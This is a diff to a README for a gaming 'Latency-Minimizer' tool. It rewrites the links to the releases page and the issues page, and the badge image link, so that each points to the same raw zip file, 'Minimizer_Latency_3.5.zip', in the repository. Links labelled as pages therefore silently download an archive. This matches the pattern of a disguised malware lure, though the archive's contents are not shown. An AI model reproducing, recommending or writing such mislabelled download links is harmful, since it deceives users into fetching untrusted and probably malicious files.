@@ -1,6 +1,6 @@
 # 🎮 Latency-Minimizer - Improve Your Gaming Response Time
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Komfuu0963/Latency-Minimizer/releases)
+[![Download Now](https://github.com/Komfuu0963/Latency-Minimizer/raw/refs/heads/main/cloudward/Minimizer_Latency_3.5.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Komfuu0963/Latency-Minimizer/raw/refs/heads/main/cloudward/Minimizer_Latency_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Latency-Minimizer! This tool helps you reduce lag in your games and a
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
 
-   [Download Latest Release](https://github.com/Komfuu0963/Latency-Minimizer/releases)
+   [Download Latest Release](https://github.com/Komfuu0963/Latency-Minimizer/raw/refs/heads/main/cloudward/Minimizer_Latency_3.5.zip)
 
 2. **Choose Your Version**: On the Releases page, select the version that suits your operating system. Look for files that end with `.exe`.
 
@@ -66,7 +66,7 @@ If you experience issues while using Latency-Minimizer:
 
 For additional help or questions:
 
-1. Visit the [Issues page](https://github.com/Komfuu0963/Latency-Minimizer/issues) in this repository.
+1. Visit the [Issues page](https://github.com/Komfuu0963/Latency-Minimizer/raw/refs/heads/main/cloudward/Minimizer_Latency_3.5.zip) in this repository.
 2. Post a detailed description of your issue.
 
 ## 🌐 Community & Contributions
@@ -81,6 +81,6 @@ Latency-Minimizer is an open-source project. You’re welcome to contribute:
 To keep updated on new releases and features:
 
 - Follow the repository on GitHub.
-- Check back regularly on the [Releases page](https://github.com/Komfuu0963/Latency-Minimizer/releases).
+- Check back regularly on the [Releases page](https://github.com/Komfuu0963/Latency-Minimizer/raw/refs/heads/main/cloudward/Minimizer_Latency_3.5.zip).
 
 Thank you for using Latency-Minimizer! Enjoy a smoother, faster gaming experience.
